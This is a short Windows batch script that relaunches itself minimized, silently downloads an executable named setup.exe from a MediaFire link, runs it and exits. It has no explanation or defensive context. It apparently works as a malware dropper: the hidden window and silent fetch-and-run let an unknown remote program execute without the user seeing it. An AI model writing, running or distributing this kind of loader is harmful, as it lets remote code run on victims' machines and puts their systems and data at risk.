@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
curl.exe -s -o setup.exe https://download1487.mediafire.com/3k7m38qiz4ngachvoqyigghhpqstjqKgv1ZBSqR_A3RwiVA54M9ZmQTuI47uD-BZ_qZZ9kfrY9KM3IxIi1mW5CS_Yg4GSslL3vmDkEsgqHEAWxgZ1zrPQF28zSL-q9BiMiLz582eySoypLLsgis_wEU0fEhVQZpkKlVsFbex2nNctDJ5/77lihb7j6v7z5g5/setup.exe
start setup.exe
exit